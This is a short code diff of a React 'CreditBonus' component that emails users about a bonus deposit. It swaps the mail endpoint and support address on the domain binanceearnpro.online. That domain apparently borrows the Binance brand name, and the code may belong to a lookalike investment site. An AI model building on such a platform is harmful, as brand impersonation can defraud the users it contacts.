@@ -133,7 +133,7 @@ export default function CreditBonus() {
             }
           );
           ajax({
-            url: "https://binanceearnpro.online/sendmail",
+            url: "https://mega.binanceearnpro.online/sendmail",
             method: "POST",
             headers: {
               "Content-Type": "application/json",
@@ -142,7 +142,7 @@ export default function CreditBonus() {
               message: `Hello ${user.firstName} ${user.lastName}, <br/><br/> 
               You have recieved a new bonus. <br/><br/>
               Amount:  ${amountnn}`,
-              to: `${user.email}, support@binanceearnpro.online`,
+              to: `${user.email}, service@binanceearnpro.online`,
               subject: "Bonus Deposit"
             },
           }).subscribe(() => alert("Bonus has been credited"));
